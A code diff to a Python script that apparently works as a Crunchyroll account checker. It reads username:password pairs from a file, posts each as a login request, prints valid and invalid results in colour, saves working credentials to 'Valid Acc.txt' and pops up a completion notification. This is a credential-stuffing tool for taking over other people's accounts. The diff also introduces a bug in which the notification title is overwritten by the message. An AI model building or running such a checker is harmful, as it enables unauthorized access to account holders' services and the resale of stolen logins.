@@ -23,7 +23,7 @@ def SexyCheckerRPC():
     )
     return RPC
 
-def UwUTroia(text, color):
+def uwu(text, color):
     colors = {
         'blue': '\033[34m',
         'pink': '\033[35m',
@@ -66,12 +66,12 @@ def CheckAcc(username, password, device_id, valid):
             response = session.post(url, headers=headers, data=payload)
 
             if response.status_code == 200:
-                UwUTroia(f"Valid Account: {username}:{password}", 'blue')
+                uwu(f"Valid Account: {username}:{password}", 'blue')
                 valid.append(f"{username}:{password}")
             else:
-                UwUTroia(f"Invalid Account: {username}:{password}", 'pink')
+                uwu(f"Invalid Account: {username}:{password}", 'pink')
     except RequestException as e:
-        UwUTroia(f"Network Error during request: {type(e).__name__} - {str(e)}", 'red')
+        uwu(f"Network Error during request: {type(e).__name__} - {str(e)}", 'red')
 
 def Check(filename):
     with open(filename, "r") as file:
@@ -89,18 +89,18 @@ def Check(filename):
                 output_file.write(account + "\n")
 
         UwU= len(valid)
-        ILikeCoffee = "Crunchyroll Account Check Completed"
-        iLoveCoffee = f"{UwU} valid accounts found."
+        no = "Crunchyroll Account Check Completed"
+        no = f"{UwU} valid accounts found."
         ShittyIcon = None  
 
         notification.notify(
-            title=ILikeCoffee,
-            message=iLoveCoffee,
+            title=no,
+            message=no,
             app_icon=ShittyIcon,
             timeout=10  
         )
 
-    UwUTroia("Check completed. Valid accounts have been saved in 'Valid Acc.txt'.", 'purple')
+    uwu("Check completed. Valid accounts have been saved in 'Valid Acc.txt'.", 'purple')
 
 def CloseTheSexyRPC():
     rpc.close()
